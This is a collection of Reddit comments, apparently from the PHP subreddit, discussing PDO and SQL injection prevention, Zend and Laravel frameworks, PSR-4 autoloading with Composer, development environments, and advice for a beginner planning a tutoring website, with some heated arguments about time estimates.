Depends on what you mean by "live".. it's pretty much outdated.. 
Tried beanstalkd + pheanstalk + zend fw 2. It's stupid simple, fast and übercool!
no offence to OP, but any recommendations for a PDO tutorial? I am wanting to start learning PHP again after several years, and I need to learn to use PDO instead of mysql_query etc. 
I disagree. It's a great learning resource. For each design pattern, just google it to get the explanation. The code really helps to understand how it could be used in practise. It's really good, and helped me instantly "get" a few of them - the adapter pattern just seemed so obvious to me after going through his code, for example.
I think this is pretty descent http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers
StrokeIt is such a suggestive name
I came here to say basically this. Just wanted to thank you for keeping it real. Let me add as well: don't be a PHP developer. I'd never hire a senior "PHP" Developer. I'd never hire a senior "Ruby" or "Python" developer, either. Rather, I'm going to hire senior developers. Furthermore: "dependency management, design patterns, advanced caching techniques" these are fundamentals. I don't expect someone out of college to have a firm grasp of these, but someone with 3 years of experience, yes. But these aren't senior level topics. Being able to discuss Decorators isn't limited to senior developers. It should be parlance for developers. Granted, one person's senior is another person's junior. If you end up being the smartest person where you work, move on to another job. A while ago, I sent a PM to a user here offering some advice. It's fairly long winded (as I'm prone to be), but hopefully it offers up some advice. ==== Browsing through the code, there are lots of areas that need work. At it's core, this is a traditional PHP app, the type most developers I know try to avoid. Unfortunately, your asking about MVC specifically. The issue isn't MVC, but about software architecture in general. If I were you, I'd learn an MVC-based Framework first. Zend or Symfony. Avoid CodeIgniter despite it's popularity. It's popular because it's easy, not because it does things well. Keep in mind, both Zend and Symonfy make choices I disagree with at certain points. That's fine. The point isn't that we agree with everything. It's that I can understand the patterns they are using. And that brings me to my next point. Patterns. Patterns are dangerous. Design Patterns can lead you down a road of saying: "I need to build something for a database connection, I'm going to use a Factory to create Singletons and use Decorators to add functionality!" That's generally the wrong way of doing it. Rather, you are building your objects, and patterns naturally evolve. Or it becomes apparent that a certain problem you have is solved by an existing pattern. Do not assume that just because someone solves a pattern one way that it's the best way. After all, CocoaTouch is riddled with different ways to handle callbacks, with Delegates and Blocks being the two most popular. In a way, both have their advantages and disadvantages (and while I like blocks for the simplicity, they feel dirty). There are a number of books I can recommend on the subjects I've been discussing. They are not light reading, and they are not PHP focused. However, I believe they make you a better programmer. The easiest is Implementation Patterns by Kent Beck. From there, Design Patterns (the Gang of Four book) is a classic. Again, it's not a simple read. It doesn't hand feed you. I still reference it to this day. Patterns of Enterprise Application Architecture. This is a wonderful book, and in it, it describes MVC. it also describes other patterns you'll recognize, such as the Front Controller (such as redirecting all traffic through a single index.php file). Refactoring and Refactoring to Patterns are both excellent books as well. Finally, Test-Driven Development by Kent Beck is excellent, though a tad basic in learning TDD. Finally, Growing Object-Oriented Software is a wonderful book that walks you through how to write test driven software. Going over the steps and actually following the progress of a "real" application being written, and the decisions made along the way. I can also heartily recommend Clean Code by Robert Martin (Uncle Bob). Finally, if you want a book more on you s a professional programmer, Clean Coders by Robert Martin is also excellent. He also has videos covering the Clean Code topics at CleanCoders.com, though they can get a bit pricey. If you start with Clean Code and Clean Coders, and move on from there, you'll do fine. I'd love to be able to point to a simple book and say "read that and you'll understand everything!" but that's not the case. I continue to read to this day. Rereading the above books, watching the videos, and all together, trying to continue to learn. Something else you can do to learn, that won't cost you a thing, is reading other peoples code. Understand why Zend's router works they way it works. Understand what they are doing. If Zend is too complex (and it is complex), you can also look at something like Slim Framework. It's a micro framework that might suit your needs. And that it's smaller, you can play around with it, learning about it and how it works. Studying others code is a big part in learning. That all being said, don't be afraid to explore new things. I've played around with different ways of handling Dependency Injection, and it's been a wonderful learning experience. You learn more from failure than from success. The most accomplished people failed the most. The key is that they learn from the failures and use those lessons to fuel their next attempt. Sorry this is a big long winded. And I know you were probably looking for something different. I'm on vacation though, so this is what you are getting.
Just curious what version of phpStorm do you have? Because I downloaded strokeit and it doesnt work for me :( EDIT: Just a FYI if you ever run in a similar problem. If using Windows, just run StrokeIt (or any software) as administrator and it will work inside phpStorm
You are right on one thing: If you use PDO correctly, there will be a ZERO risk of SQL injections. Unfortunately, your code has a greater than zero risk of injection. You need to be either explicitly setting the character set DSN parameter, or turning off emulated prepared statements... [More information](http://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218)
I don't know CI very well so it's hard to say what's different from Zend but I do know Zend very well. The biggest difference (as others have pointed out) is that Zend is more or less a collection of classes that allows you to pick and choose what you want to use. Zend does not contain an ORM layer. The closest thing is the Zend 2 table models (allowing you to point your own models that get pulled out when you retrieve database rows). Zend's philosophy has always been to avoid the model layer (you can easily use it with Doctrine though and many people do). There is a huge difference between Zend 1 and 2 and I would not recommend starting any new projects with Zend 1. It's old, many of the modules are insanely difficult to work with (ahem Zend_Forms) and have been redone properly in Zend 2. I went through a large upgrade from Zend 1 to Zend 2 and I do feel it was definitely worth it. There were quite a things in our project that we added because Zend 1 was lacking which we ended up replacing with the Zend 2 modules. It takes some time though so don't expect to do it overnight.
Will do, thank you 
Hi Dabruc. Thanks for the detailed reply. Sounds like moving from Z1 to Z2 definitely isn't an over-nighter so 
Added!
Thank you, fixed :)
I've added this, thanks!
Thanks for all the comments, I really do appreciate all the help. I've updated the tutorial to include what you guys have said. If there is anything else, please, let me know! 
A developer who does not know any frameworks or has only done PHP on a single framework is entry level. Developer with experience with multiple frameworks and three years on their back is certainly not entry level.
oops being on xp I forgot all about the run as administrator issues on 7/8.
Typical programmer. "Few hours". 
Says the VBasic "programmer." \*chuckle\*
I was under the impression that they were slow/outdated in development due to backwards compatibility. I just read up on it a bit though and it seems you are right, it's not looking good. I wonder what will happen if/when someone buys it, it might be hard to save now.
How long will the $19 pre-sale last?
Agreed, coming off like a dick at the end there. Having worked for multiple massive corporations, I can tell you this absolute certainty. A persons title, how much money they make, or even how big and important their company seems, have very little correlation with their level of skill. That said, I have to agree with everything he said about PHP. 
I agree Ruby would not be overkill. But I think the learning curve could be a little steep over php for a first project. 
It is so good you need to Google elsewhere to find out what they are about? That is exactly my point. If you already know the patterns, through other sources, then I agree these are great reference examples. But for learning the patterns, I'm not sure it stands on its own. So yes, a good resource, but the explanations of the patterns are elsewhere. 
He knows nothing about any of this, just simply has an idea. It'll take him longer than "a few hours" to put up a testing environment.
I will take up the challenge. Tasks: - Design - figure out data entities, figure out UI - Database - create tables and indexes - Coding - Profile page admin, Profile page view, Student Login Page, Reports (define + code) - Testing - Deployment - wheres is being hosted, any documentation / help screens needed. Any phase 2 development stuff. Backups (if hosted locally). So a few hours is a silly estimate. The project is not even clearly defined or designed. You have a few general requirements which will change when you sit down and do the analysis. I think your estimate is a little rushed. Unless of course you are just going to develop what you think he needs and not what he actually needs. 
I just wanted to say.. I love your username... Made me happy.
Until Sept. 15th (thanks for asking, just added this to the website).
Use PHP. Its simple, has lots and lots of support and online tutorials. Google for PHP tutorials. You also will want to learn some html, javascript, jQuery. So google them too. Download xampp for Windows and install it - now you have a local development environment (assuming you use Windows). Or get an account with phphosting4free - now you have a free remote development/runtime environment. Google phpmyadmin and use it (in your xampp environment) to create a couple of database tables for your tutors and students. The data is being stored in mySql so google some tutorials for that too just to understand what it is. Google 'php save form to database' and use the results to write a simple form to save the data entered into the fields into your database tables. Ask lots of questions. Once you have the basic ability to get data from the user and store it into the database, learn how to select the data back from the database into a view. Now you have the basic components for creating an applicatiion. Now learn some more advanced stuff: - how to write a html form (form.php) and use jQuery and $.ajax to send the form data to a php program which stores it in the database. - how to add a nice menu to your form - how to add a login screen and security so only logged in users can see pages in your app. - how to use jQuery to show different pages when different menu items are clicked. - how to use ajax to read data back in from your database and show it to the user. Good resources are reddit and stackoverflow for general questions. I suggest you learn basic PHP before use a framework. There are also many great PHP books on Amazon.com. As you learn you will probably get addicted to the cool stuff you can do, you will probably start adding more and more ideas/requirements to your app. Try to create a simple version first which has just the basics, then create a version 2 with some extra bits, then version 3 etc. One more piece of advice - when you google stuff, choose the More Options and limit your search by time to the last year - there is no need to get loads of out of date information. Good luck!! 
It doesn't really matter. Choose the most appropriate database technology for your product as that is the core of its functionality. THEN choose the most simple language for manipulating that DB.
I know all of this. How do you put up your testing environment, installing everything by hand? I'm using Vagrant plus puphpet and never spent more than half hour setting up the testing environment. 
I think you face a much bigger challenge than simply the choice of language here. If you're just getting started with backend development, then whether you choose PHP, or Ruby, or Python or even Java is not your biggest obstacle to overcome. If I had to recommend one, I would go with PHP simply because, programming aside, it is the easiest language to set up hosting for and to get up and running online once you're ready. That said, you are far from ready.. Now I am not trying to discourage you from doing this, in fact having a clear and practical goal is often the best way to stay motivated when learning something new... But that said, may I perhaps suggest that you prototype the business logic of your application and then use that process to find **yourself** a PHP tutor? Spend time planning out your application in detail and really mapping out everything you want it to do on paper ("paper" is a context here, you can use a wireframing tool or Visio or whatever you want), and then also try to map out all the different business objects ("clients", "tutors", "reviews", "skills", "messages", etc) and identifying all the attributes those objects will need, and how they will be related.. Once you've put all this together (commonly referred to as the Business Requirements of your project), then you can perhaps find someone who can help you tackle the actual planning and software engineering of your application. They can review your goals and your documents, and probably help you pick the framework or platform that is best suited for your project, and get you over that daunting initial step of getting your feet wet in the environment (understanding how and where to get started, and so on). You can certainly do most the programming work yourself, it's the best way to learn, but do try to find someone who can review your work along the way, and help guide you in the right direction.. Software development is like constructing a high-rise building.. You are constantly building on top of your previous work, and if you don't have a solid foundation beneath you, you will find yourself in a lot of trouble later on down the road, so much so that you sometimes can't even finish your project without restarting. I just think that if you're approaching this endeavour for the first time, getting advice and mentoring from an experienced developer will go a long way at helping you not spend hours (or even days) going down the wrong roads in the early days of your work. Without guidance you may end up making some fundamental mistakes early on that won't become evident until much later, at which point you may be facing a _huge_ amount of work to fix those mistakes, and that can be extremely demoralizing.. Good luck! 
Great, will you publish any chapters before that date?
I would be willing to assist you if wanted to bounce ideas or need help with some code. I have taught myself php over the last few years and made a couple of sites. I learned php with codeigniter, but now realize it is a very old framework, so I'm trying to learn Laravel. 
&gt; Typical _amateur_ programmer. FTFY
haven't read this yet, but want to say thanks now before I forget. have read the intro and looks like a decent article. so thanks!
If you don't really know how to code, I would vote for PHP. There are tons of books, tons more examples, and is pretty easy to get started on with WAMP and LAMP stacks. I personally started PHP using this book: http://www.amazon.com/Head-First-MySQL-Lynn-Beighley/dp/0596006306 But, if you don't want to take a formal training after this, dive in. It'll take a bit, but you can search and read for the stuff directly what your after. I have built a couple applications this way, and was fun.
jQuery is not a programming language -- it's a javascript library and he merely said that he has experience with it. Considering javascript !== Ruby | PHP, OP is gonna have a bad time if he thinks because he knows a little bit of jQuery that he's going to be able to jump right in. To be more precise, he would not be using Ruby, he would be using Ruby on Rails which is still different than Ruby. So, if OP chooses the Ruby road, he'd have to learn proficient Ruby AND Rails to write anything effective. I never said working with frameworks fucks everything you've learned before, however, learning workable PHP, then attempting to work with a framework are two very different things. You can learn PHP basics and still not know how to work with a framework correctly. Instead, if he chooses to work with a framework, he should attempt to learn very basic PHP practices, and then proceed to learn what he can from the framework documents; effectively making the time he took to learn 'the basics of PHP' time wasted. __You__, sir, make no sense at all; I'm quite reasonably attached at the neck.
Definitely, working on getting the first chapter published by Wednesday of next week.
ok, thank you for your time
Do you have any good recommendations for resources on Laravel? From setting up Laravel to implementing Users? (and more) I have a RoR background so I'm a little bit more than a beginner, and am really familiar with MVC, routing, migrations, etc. Most tutorials I've been reading don't have the continuity that I've been accustomed to like in RoR.
[Are you legitimately retarded? Of course jQuery is a javascript library!](http://i.imgur.com/OjIgkDg.png) Literally every reply that you've made in this thread has gone from bad to worse. Due to the __obvious__ lack of experience you have, I'm really not going to continue this discussion... Hopefully next time you choose to throw around your opinion, you would ensure that you have some legitimate experience to back up your claims __before__ you give out your opinion.
&gt;newbie &gt;documentation and deployment Jesus Christ man, just because you know functional programming does not make you a good programmer. I've been disappointed in posts I've seen in this subreddit, but yours honestly take the cake. Quickly developing something and calling yourself a programmer is absolutely meaningless. I'd rather take 20 hours to develop something and have it work well, and be functional that grind out total __shit__ and put my name on it. Goddamn, man.
hi! thanks for looking at this. any constructive feedback is highly appreciated!
I would recommend folowing [Dayle Rees](http://daylerees.com/). He writes very clear Laravel 4 tutorials and has written a book about Laravel 4, [Code Bright](http://codebright.daylerees.com/). I highly recommend it for learning Laravel 4 fast. You can also buy the ebook [here](https://leanpub.com/codebright). Some other resources I can recommend: * [Laravel.io](http://laravel.io/) * [Tutsplus](http://hub.tutsplus.com/hubs/development/search?utf8=%E2%9C%93&amp;s=laravel&amp;commit=Go) * [Culttt.com](http://culttt.com/code) * [Fideloper](http://fideloper.com/tag/laravel) * [Dries Vints](http://driesvints.com/) (also writes for Laravel.io) * [Advanced Architecture With Laravel 4](https://leanpub.com/laravel) (by the founder of Laravel) 
Perfect. Thank you.
Only compatible in 5.4+ when it could easily be done in 5.3. [http://w3techs.com/technologies/details/pl-php/5/all](http://w3techs.com/technologies/details/pl-php/5/all)
You don't need to "learn PHP" to do this unless you want to do this as a project to learn PHP. You can learn *enough* PHP to get the job done (using your current skillset) by just customizing a LMS or a CMS with plugins and without having to start from scratch. You have tons of options: Wordpress + a modified theme and built around a membership plugin, Vbulletin with mods, Drupal with social networking plugins, Joomla with Social Network Extensions, or just a seriously tweaked Moodle installation (Moodle is a learning management system), but [Datemill](http://www.datemill.com/) (A dating site script) with some detailed adjustment of the Smarty Templates is probably the simplest solution. I personally paid the original developer of that script to integrate it with Skype and Worldpay before he open-sourced it.
sure. i really like the shorter array syntax, though, but that's the only feature of 5.4, that i used in this project. so i'll consider using the old array syntax, to make it available in 5.3. thanks for the feedback. didn't think about that.
I suggest doing this in Wordpress or Drupal. You just need to understand these tools and add some plugins, no coding necessary.
If you go with PHP, beware that there is a lot of extremely bad reference material and tutorials out there. People act like they know what they are talking about, but they don't. Examples are, Googling for how to use Mysql with PHP will show you tons of tutorials on using outdated mysql functions in a fundamentally unsafe way ("sanitizing" rather than using prepared statements, parameterized queries or an ORM) . or people that suggest storing passwords as md5 hashes. All things that will come back to haunt you. Never assume what someone says is fine because it seems to work, instead learn to Google stuff like "best way store passwords php" and read up on stackoverflow.com articles that pop up, for instance. Oh, and use a framework. Don't try to reinvent the wheel. This advice would have saved me a ton of time and bad practices. :U Ohand http://www.phptherightway.com/
You know what? If you're so confident, I'm going to call you on this bullshit. I'll put 500$ on the table that you can't do all of this in a "couple of hours" as you claimed.. PM me, we'll set something up where you can screenshare with me, I'll even give you **4 hours** start to finish, and I'll sit there and watch you work.. If you get something done that is complete, secure and tested (you claim you'll write unit tests too) in 4 hours, I'll Paypal you 500$... What do you say? 
Glad to help! Programming is a creative and rewarding endeavour, and if you have a good idea you believe in, it's super fun to make it happen and then look at it when you're done and say "I made this!".. 
i made it 5.3 compatible. :)
How "real-time" are you expecting this to be? The first thing to remember is that you cannot trust the client in any way. All of the user choices have to be validated server-side and then all the combat has to be resolved server-side.. Making this happen in real-time is ambitious, and perhaps it would be good to start by making it sort-of-turn-based. You can use a counter in a database table (or flat file) to track which "turn" (also called "game ticks") your game is at, and then resolve the combat for that step. Then on each request (and you can rate-limit this by only advancing on a minimum of each X seconds, let's say 2 seconds), you advance the "turn" and resolve any combat that is pending.. This way, each player is watching the combat go on, and they can place orders into your action queue (which would be a different table in your database) and those get resolved as the game proceeds.. You could have a Javascript based timeout call making an Ajax request in the background to keep things moving along when a player has the browser open.. If no one is currently playing, then your game would effectively be paused, but that's ok because no one is "watching".. When someone connects, the game checks the action queue for anything that has been added but not yet resolved, and works its way through those actions until it has caught up to "now" and the players continue.. So this would be a simple approach to a multiplayer game using only PHP and a database and web browsers.. If you have more control over the server, you can run a command-line PHP script that just runs in a continuous loop (or as a cron job) and advances the game turns that way as well, but not all web hosting places will give you cron job access to set this up.. Hope that gives you some ideas to get going..
Constructive feedback is very welcome. Part 1 is [here](http://www.bitfalls.com/2013/08/autofight-php-job-interview-task-part-1.html) and discussed on reddit [here](http://www.reddit.com/r/PHP/comments/1kq398/autofight_a_php_job_interview_task_tutorial_part_1/).
So now `vendor` folder will be polluted by "demo", "tests" and "readme" not because Composer can't do it right, but because it's "a reflection of a slightly older standard"? My `vendor` folder looks pretty clean without all that crap and I use lot of modern PHP libraries and SDKs - because they frollow PSR-0 and I can use only their code, without dirt and chaos in folders structure. All these dirty prefixes is for old libraries or libraries where developers won't follow PSR-0. New standards should be followed be new libraries, not serve legacy code. &gt; map Foo/Bar/Baz to vendor/foo/bar/src/Baz it will make folders structure unpredictable. Not for autoloader, but for developer. I can be pretty sure where can I find file of class when library follows PSR-0, but that "src" in the middle of the path - why? It's unpredictable.
Your `vendor` folder will look identical to how it looks right now. I'm not sure what has made you think differently. Is there some wording in the spec we could try to tighten up? Remember, Composer handles the vendor folder, it handles the folders inside it (the package vendor name, and the package name), then inside that is where PSR-0 (and PSR-4) will pick up (usually in a `src` folder). The only changes happening are to what is inside that `src` folder.
My `vendor` folder doesn't contain any "src" subfolders. And I don't use Composer because with Composer I don't see PSR-0 predictable tree of libraries, but chaos and dirt of endless "lib", "src" and "tests" folders, somehow mapped by autoloader of Composer.
I even have autoloader which follows already that "PSR-4" (shortest "standard" I even read), but it was just dirty hack to make old libraries work (I don't use it already). Mapping of namespaces to subfolders should never be called as "standard", it should be only temporary workaround for old libraries..
No, PHP can also connect on sockets. My personal preference is React. http://reactphp.org/ Pusher is a 3rd party API, if you want to learn, don't use it. Also, try not to go with hacky ajax polling options like sebzilla suggests. We're not living in stone age anymore.
Shit. I just played hearthstone all weekend.
Absolutely. Some of the biggest companies I ever worked for had the worst standards and practices with relation to IT. By contrast, some smaller companies have had more focused teams and better management of them.
best excuse so far.
I agree with you. It's a good resource, but not for learning. You can see what it looks like, but that's useless if you don't know how to use them.
Re-reading this is seems like you added more information about your concerns, so let me try and help you understand PSR-4 a little better. &gt; map Foo/Bar/Baz to vendor/foo/bar/src/Baz &gt; it will make folders structure unpredictable. Not for autoloader, but for developer. I can be pretty sure where can I find file of class when library follows PSR-0, but that "src" in the middle of the path - why? It's unpredictable. The `src/` is a popular convention for developers creating a PSR-0 package (and has been a convention with code packages, gems, pecl extensions, JS files, etc since programmers first worked out how to share packages. Some call it `lib/` or `source/`, some don't bother using it at all. Now, in this example `foo/bar` is the Composer vendor name and package name, NOT anything to do with PSR-0 or PSR-4. As you don't use Composer I guess you don't know that? PSR-0 with Composer looks like: &gt; Foo\Bar\Baz to vendor/foo/bar/src/Foo/Bar/Baz PSR-4 with Composer looks like: &gt; Foo\Bar\Baz to vendor/foo/bar/src/Baz That is not any more difficult to find, because even with PSR-0 you have to know that the Foo\Bar namespace is the `foo/bar` Composer package, and once you're in there its pretty damn obvious what you're looking for. The only difference for the developer is they dont have 1+ (maybe 5 or 6) empty pointless folders to click through to get to the code they want. Remember, those Composer vendor/package names do not always match up with the PHP vendor/package names. In fact its very common for composer to be lowercased with hyphens and PHP namespaces to be all PascalCase. So, your concerns are confusing. PSR-4 is no different to PSR-0 in this respect, and it will not somehow clutter your vendor dir. Keep on using PSR-0 forever, or use PSR-4 to autoload the exact same code you're autoloading with PSR-4 right now. If you aren't using the namespace prefix feature you wont need to reshuffle your autoloaded code at all. The real benefit here is for people making packages (and using Composer or some other not-yet-existent-but-similar system), and as you aren't using it you really don't need to worry.
Hah.. I love how you accept, but then change all the parameters. I'm the one making the offer here, so the terms are mine to dictate, sorry! It sounds like english isn't your first language, so for future reference "a few hours" is not 8-10 hours.. 8-10 hours is "a day" in work parlance.. So I figured I would give you **4 hours**, which is probably what "a few" means here... Now you come back and say "ooh wait the words I used didn't really mean what I meant". So you're back-pedaling here then... So anyhow, my deal was 4 hours, not 8-10 hours.. I took my cues from your cocky blustering, superstar.. If you're in for 4 hours, let me know..
Composer is a library manager for php. It uses an autoloader and other cool stuff to make it insanely easy to include others code in your project. Puppet/Chef are two similar products whose goal is to allow sysadmins to script out the configurations of new servers. They handle installing and configuring php, apache, mysql, etc. They're really helpful for deploying vpses dynamically. If you're just worried about code, you don't need to look at puppet or chef; though they are handy to know.
Composer is for installing PHP dependencies (other PHP libraries). Vagrant is for managing the provisioning of Virtual Machines. Puppet or Chef do the actual provisioning of the LAMP stack and whatever other software (not PHP libs) you want on your server. You would generally use composer in addition to Puppet or Chef. For example, you would probably have a Puppet rule that runs a composer update at some point.
Take a look at http://umlfactory.com . It is nice because it works great on my tablet for those times when I can't have the focus and time necessary to grind good code. Not only is it documentation, but it is a plan that makes the time when you can focus more productive. You will catch logical problems before they happen most of the time. You'll see the process break down before you even write one line of code-- and you can fix it, right there in the planning. I wholly support the idea of mapping out the process.
Newbie developer here. What's the purpose of typing 'array $var' instead of just '$var' in the parameters?
Why only back-end - they OP said "I want to make a site for students to find tutors to coach them one on one," . so why would you assume that. Sorry sir, you are on the hook for a whole site, not just the back end. I am going to give you the benefit of my experience. Dont start flame wars by saying things like "you sound like a complete newbie". A few other guys also pointed out your mistake. And thats all I think it was - a mistake. You started out trying to help the OP and should be commended for that. I think your mistake was that assumption. You clearly have a grasp on technical knowledge and have some good experience. I dont claim to be as good as youor as knowledgeable as you. I have been quite lucky in my career (since 1987) to have known just enough to implement multi-million dollar applications for the biggest corporations and run large technical teams and complex projects. Rather than waste your time or ego on the claims you have made and the $500 challenge (such a small amount of money), I suggest you re-focus on the OPs original question. Maybe knock out a quick GIT for him with a basic client/server component for his site so he can take that and build on top of it. This would be a freebie but we would all applaud you for it. Your original intent was to help and I think you can still do this. In any case I do not wish to enter a war. You make some valid points and may use some tools I have never used. If you have automated your web development to the level you have suggested I applaud you and look forward to learning from your GIT project. One final thing - if you are gracious enough to help the OP with a sample of his project - please share the result in this thread. 
http://php.net/manual/en/language.oop5.typehinting.php
This kind of explains what Composer does: https://jtreminio.com/2012/10/composer-namespaces-in-5-minutes/ If you're familiar with other languages, Composer would be similar to [npm](https://npmjs.org/), [ruby gems](http://rubygems.org/), [CocoaPods](http://cocoapods.org/), and [pip](https://pypi.python.org/pypi/pip). Puppet is explained [here](https://jtreminio.com/2013/05/introduction_to_vagrant_puppet_and_introducing_puphpet_a_simple_to_use_vagrant_puppet_gui_configurator/) and [here](https://jtreminio.com/2013/06/make_vagrant_up_yours/). Puppet and Chef are used for easy server configurations. Get it? Composer is PHP-specific (mostly) and Puppet/Chef are server-level.
Sure man, sarcasm. Nice 'save,' whatever you say, bro. The very fact that you judge a man by his github account shows your level of intelligence. That's all I'm saying.
I don't want to beat a dead horse... but you're looking at the problem through the lens of an experienced programmer. There's no way a total neophyte would even know what Vagrant or puphpet are, much less be able to set them up in a half hour..
Of course the people in /r/PHP are going to recommend PHP. It is a good language and certainly a great choice for a web project. It seems to be the most popular and easiest to get started with server side programming language but not the only. Other popular languages typically used for web servers are Python, Ruby, Perl, Java, and C#. Facebook uses a build of PHP. Reddit uses Python. Twitter used Ruby initially but switched to Java in May 2012 to make their servers go faster. I don't know any off my head that use C# but the ASP.NET framework which is a popular Microsoft framework is built on C#. I don't recommend using ASP.NET though or else Microsoft will slowly but surely suck you into their money bubble. Would I personally recommend PHP? Yes. I'm also on the Laravel bandwagon, Laravel 4 rocks, use it. :D
You should indicate the Imagick dependency on your composer file :)
Use this as an opportunity to [learn to write tests](https://github.com/sebastianbergmann/phpunit/).
Mike, As a software company owner who also spent 3 years playing poker I will give you a break. The problem getting a job is you need experience and you need a job to get the experience. Contact me and I will set you up with an offer for a small paying project to see if you can handle it. It wont be great money but maybe will help you get some initial real-world experience. 
First of all, you'll need the fight engine, let's call it a BattleroundResolver class. This takes the attack choices and attributes of two players (split between data which changes each round and that which is fixed) and calculates the winner and the impact on each (e.g. health loss). It's not that hard to do, just list the steps needed (don't forget database storage) and write each out into a class method. You can worry about making it look pretty later. Use long method names which describe each step/method. Use long method parameter names with consistent naming across the whole class. All of this helps with maintenance and future changes. Once you can calculate a round, declare a winner, and store the results and player unit changes &amp; scores, you need to communicate it back to the players. Input &amp; Output Security: Now is the time to learn about how players might try to manipulate input (e.g. forms) to cheat the game. Make sure they submit valid information. Lots of resources online about filtering/validating input but also bear in mind "business rules" and "business logic" (substitute game for business), e.g. if a player chooses to wield the Mighty Hammer of Thor (they edited the form in the browser), but they only have access to A Pointy Stick, you'd need something in place to catch that, e.g. check it against their inventory in the database. I'd get everything working to the point you can test it. Look up PHPUnit and try it out for the class you wrote (if following this advice in any way - or not!). It will help catch errors and bugs. If you're feeling adventurous, do some reading about Test Driven Development before writing the class. Despite some advice later on, you can have browsers "poll" a URI every 10 secs or so to fetch the new battle result and trigger a new round. This involves AJAX (i.e. Javascript and something called XmlHttpRequest - might be easier to now look into using jQuery). Polling is an easy method though not the best - I suggest it as a learning step. Once everything works with polling - or even simpler, manual browser refreshes, you can look into more efficient improvements.
Use Google app engine 
As the article mentions, the "app" will be upgraded into something more advanced in a follow up series (the code is actually already written in part and takes into account armor types, equipment, army formations and more) but this is just a demonstration of the job interview task I had to do in a day, and how I got through it. The type prefixing is just a habit of mine. It probably doesn't matter much to anyone but me, but I use it because I'm just used to it. As for the die instead of exception, like I mention in the article, I would usually throw an exception at that point, but I neither deemed it necessary nor useful, considering the scope of the task. The advanced version has a registered exception handler and displays proper error output when needed. At this point, taking into account readers who are potentially new to OOP and PHP in general, I felt like adding an exception handler at this point would have been a bit much. Thanks for the feedback!
uhm... you don't really have differenciation of types in php int==string==float (kinda\^\^). but you can still typehint other classes (which in fact are data types). this is what i use it for mostly.
take a closer look at the composer.json: &gt;"require": { "php": "&gt;=5.3.0", **"ext-imagick": "*"** },
I'm the first to point at PHP's default settings for lots of things and cry foul (check how the SOAP extension handles SSL - e.g. https://github.com/hades200082/SecureSoapClient). That said, once you can configure the cache location, you should be relatively okay from the given vulnerability though, seriously, I wouldn't use shared hosting for anything sensitive. There are lots of cheap options for dedicated/virtual hosting.
puppet/chef load stuff for your server, composer loads stuff for your application.
&gt; Download xampp for Windows and install it - now you have a local development environment (assuming you use Windows). Or get an account with phphosting4free - now you have a free remote development/runtime environment. Honestly, I don't think either of these is a great way to work. XAMPP is a pain in the proverbial, and remote development is worse. Better idea - install Virtualbox and [Vagrant](http://www.vagrantup.com/), then use that to develop locally. I have a boilerplate for starting PHP projects at https://github.com/matthewbdaly/vagrant-php-dev-boilerplate that includes a full LAMP stack, as well as msmtp. That way you can place your server config under version control. 
Sure, we can have a conversation about vendor lock-in and local machine development environments.
That argument still avoids the other benefits of the frameworks being compared. If we all picked the fastest more efficient framework ever, guess what - we'd all be using basic PHP functions like it's the 90s. If we follow the trends, very simplistically, PHP has three tiers: PHP, Lean Frameworks, and Fat Frameworks. The Lean frameworks offer basic MVC and simple APIs to other features. They are slower than PHP but a lot faster than Fat Frameworks. Fat Frameworks are more complex, offer more features, and are slower by an order of magnitude. In other words, the more stuff you want to do, the more time it takes to do it. Not that I'm trying to undermine your point too much. There is more than enough inefficient code to go around. For example, you can make a Zend Framework 1's base performance significantly better by doing a few simple things (removing bootstrap class, default view resolution, default autoloader etc.). ZF1's performance is a lot better than it gets credit for because it includes stuff by default that you can live without if you really want to.
&gt; If you're familiar with other languages, Composer would be similar to npm, ruby gems, CocoaPods, and pip. Bundler is probably the better analogy than rubygems.
Three parts for this first series about the actual job interview task. Then a couple more about upgrading the thing and making it all more pro. I'll see how much interest there is, obviously this tends to get time consuming. If not much interest is generated for the articles, I'll just finish the code and upload it to Github for people to play around with. Glad you like it! 
Chef/Puppet install all the shit your server needs to run, configures the virtual host fro Apache/Nginx, installs PHP and its extensions, configures cron jobs, all of the server-related jazz. Composer downloads some PHP packages (not extensions) for a specific application by reading a composer.json.
Composer is perfectly PSR-0 compatible, it just doesn't make EVERYTHING in the ENTIRE vendor folder PSR-0, as that would ruin compatability with non-PSR-0 stuff. Nobody on the Composer team wants to force PSR-0 down everyones throat, and nobody wants to force package developers to rip out the src/ folders. PSR-0 starts INSIDE the package, not at the root of the vendor folder. I think you need to read [this article](http://philsturgeon.co.uk/blog/2013/05/composer-and-psr0-friends-not-relatives).
Well, that depends on the cart system. Being a newbie, in order to do something basic, you need a few months. Now try to implement Magento, and you are goin to have a bad time.
This is a good place to start: http://www.phptherightway.com/ This is a good book to read: http://amzn.com/B004VJ2Z7M Shopping cart systems are generally on the upper-end of PHP development, not because they are hard to make but because they are hard to make right. Anything dealing with money is a security nightmare; so I suggest starting with the easier parts of the language first, or using a 3rd-party shopping cart system which is already secured for you.
If you're interested primarily in web dev, I wouldn't try picking up Go just yet. It's one to keep an eye on... The Revel Framework looks very interesting to me but I wouldn't put any of it out into production right now. But most importantly, follow what piques your interest. If Go looks interesting to you and you want to learn it, Go for it (pun intended.) That's the greatest motivation to learning new things. Go seems to have a very active community behind it right now, so I'm hoping it continues to flourish.
You're welcome, but keep in mind that Using a "premium theme" like that $55 theme often takes a LOT of time/work with php and css. They never "just work" right out of the box and you may end up hiring someone to fix it if you can't figure it out. Don't forget about [Wordpress Security](http://moz.com/blog/the-definitive-guide-to-wordpress-security) .
Thank you very much for the suggestion I will check it out!
&gt; It's not about being a better developer, it's about being speedy. I can probably finish the class while you're typing "public function doSomething()" and start writing unit tests. That's a horrible practice and I would kick you off with a quickness from my team.
You're welcome.
Well, they DONT need to. That could be a job for Magento 3.
No. You really haven't. If you did, you would have known that jQuery is a javascript library. You've consistently demonstrated that you know basically nothing about programming in general; paired with your constant need to prove that you're right in all regard leads most to conclude by now that you would be a worthless 'programmer' to begin with by being incapable of admitting when they're wrong about something. I'll leave you with some advice: &gt;No one can be right 100% of the time; if they are, don't trust them.
how does one find a PHP tutor?
I'd vote for PHP, although that's largely a personal preference. People are suggesting wordpress plugins as well - these will get you off the ground, but there will be a very steep learning curve as soon as you need some custom extensions. For information, something similar already exists: https://www.apprentus.com I'm not saying you shouldn't implement your idea, but it might be useful to think about differentiation.
And since they're unrelated you can use one without the other, or both together, without any problems.
